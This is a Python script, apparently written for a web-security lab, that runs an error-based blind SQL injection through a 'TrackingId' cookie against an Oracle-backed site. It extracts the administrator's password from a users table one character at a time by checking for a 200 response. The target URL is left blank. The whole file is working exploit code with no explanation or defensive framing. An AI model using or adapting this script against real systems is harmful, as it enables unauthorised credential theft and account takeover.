from requests import Session
from string import digits, ascii_letters, punctuation


BASE_URL = ''
PATH = ''
TRACKING_ID = "Kurf1degSkA9bO4C' UNION SELECT CASE WHEN (SUBSTR((SELECT password FROM users WHERE username = 'administrator'), {char_no}, 1) = '{letter}') THEN NULL ELSE TO_CHAR(1/0) END FROM dual --"


password = ''
full_path = BASE_URL + PATH
letters = ascii_letters + digits + punctuation
with Session() as s:

    for i in range(23):
        for index, letter in enumerate(letters):
            tracking_id = TRACKING_ID.format(
                char_no=len(password) + 1,
                letter=letter
            )
            response = s.get(full_path, cookies={
                'TrackingId': tracking_id
            })
            if response.status_code == 200:
                password += letter
                print(password)
                break
        else:
            break

    print('Length of password = ', len(password))
    print('Password:', password)
